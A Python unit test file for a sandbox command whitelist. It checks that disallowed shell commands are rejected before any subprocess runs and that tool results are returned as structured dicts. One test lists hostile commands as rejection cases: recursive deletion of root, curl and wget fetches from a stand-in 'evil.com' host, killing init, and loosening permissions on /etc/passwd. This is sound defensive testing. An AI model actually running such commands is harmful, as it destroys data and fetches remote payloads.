"""
Tests for Command Whitelist and Structured Tool Results.
Verifies disallowed commands raise ToolExecutionError BEFORE invoking any subprocess/container.
"""

import os
import shutil
import tempfile
import unittest
from unittest.mock import patch

from sentinel.sandbox.exceptions import ToolExecutionError
from sentinel.sandbox.executor_sandbox import (
    ALLOWED_COMMANDS,
    run_in_sandbox,
)
from sentinel.sandbox.tools import (
    read_file,
    run_shell,
    run_tests,
    write_file,
)


class TestToolWhitelistAndSchema(unittest.TestCase):
    def setUp(self):
        self.test_dir = tempfile.mkdtemp(prefix="sentinel_test_tools_")
        self.workspace = os.path.join(self.test_dir, "workspace")
        os.makedirs(self.workspace, exist_ok=True)

        # Create a sample file in workspace
        self.sample_file = os.path.join(self.workspace, "sample.py")
        with open(self.sample_file, "w", encoding="utf-8") as f:
            f.write("def add(a, b):\n    return a + b\n")

    def tearDown(self):
        if os.path.exists(self.test_dir):
            shutil.rmtree(self.test_dir, ignore_errors=True)

    @patch("subprocess.run")
    def test_disallowed_command_raises_before_subprocess(self, mock_subprocess_run):
        """Commands not in whitelist raise ToolExecutionError BEFORE any subprocess is spawned."""
        illegal_commands = [
            "rm -rf /",
            "curl https://evil.com/payload.sh",
            "wget https://evil.com",
            "bash -c 'echo pwned'",
            "powershell -Command Get-Process",
            "kill -9 1",
            "chmod 777 /etc/passwd",
        ]

        for cmd_str in illegal_commands:
            # 1. Test run_shell
            with self.assertRaises(ToolExecutionError, msg=f"Should reject: {cmd_str}"):
                run_shell(cmd_str, self.workspace)

            # 2. Test run_in_sandbox
            tokens = cmd_str.split()
            with self.assertRaises(ToolExecutionError, msg=f"Should reject tokens: {tokens}"):
                run_in_sandbox(tokens, self.workspace)

        # Assert subprocess.run was NEVER called for any of these attempts
        mock_subprocess_run.assert_not_called()

    def test_empty_command_raises(self):
        with self.assertRaises(ToolExecutionError):
            run_shell("", self.workspace)

        with self.assertRaises(ToolExecutionError):
            run_in_sandbox([], self.workspace)

    def test_structured_result_write_and_read(self):
        """Test write_file and read_file produce valid structured logging dicts."""
        # Write
        write_res = write_file("test_out.txt", "hello sentinel", self.workspace)
        self.assertEqual(write_res["tool"], "write_file")
        self.assertIn("path", write_res["args"])
        self.assertIn("written", write_res["result"])
        self.assertIsNone(write_res["error"])

        # Read
        read_res = read_file("test_out.txt", self.workspace)
        self.assertEqual(read_res["tool"], "read_file")
        self.assertEqual(read_res["args"]["path"], "test_out.txt")
        self.assertEqual(read_res["result"]["content"], "hello sentinel")
        self.assertIsNone(read_res["error"])

        # Nonexistent file read returns structured error (does not raise)
        bad_read = read_file("does_not_exist.txt", self.workspace)
        self.assertEqual(bad_read["tool"], "read_file")
        self.assertIsNotNone(bad_read["error"])
        self.assertEqual(bad_read["result"], {})

    def test_structured_result_run_shell_allowed(self):
        """Test run_shell with allowed command returns structured loggable dict."""
        cmd = 'python3 -c "print(1 + 1)"'
        res = run_shell(cmd, self.workspace)

        self.assertEqual(res["tool"], "run_shell")
        self.assertEqual(res["args"]["cmd"], cmd)
        self.assertIn("stdout", res["result"])
        self.assertIn("exit_code", res["result"])
        self.assertEqual(res["result"]["exit_code"], 0)
        self.assertEqual(res["result"]["stdout"].strip(), "2")
        self.assertIsNone(res["error"])

    def test_structured_result_run_tests(self):
        """Test run_tests wrapper returns structured loggable dict."""
        test_cmd = 'python3 -c "assert 2 == 2"'
        res = run_tests(test_cmd, self.workspace)

        self.assertEqual(res["tool"], "run_tests")
        self.assertEqual(res["args"]["test_command"], test_cmd)
        self.assertEqual(res["result"]["exit_code"], 0)
        self.assertIsNone(res["error"])


if __name__ == "__main__":
    unittest.main()
